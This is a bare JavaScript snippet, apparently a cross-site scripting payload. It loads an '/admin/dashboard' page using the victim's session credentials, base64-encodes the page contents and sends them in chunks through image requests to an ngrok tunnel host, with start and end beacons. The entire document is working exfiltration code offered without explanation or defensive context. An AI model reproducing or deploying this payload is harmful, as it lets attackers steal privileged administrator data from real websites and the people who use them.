fetch("https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?note=start");

fetch('/admin/dashboard',{credentials:'include'})
.then(r=>r.text())
.then(d=>{

  for(let i=0;i<d.length;i+=1000){
    setTimeout(()=>{
      new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?step="+i+"&data="+encodeURIComponent(btoa(d.slice(i,i+1000)));
    },i/2);
  }

  setTimeout(()=>{
    new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?note=end";
  }, d.length/2 + 1000);

});
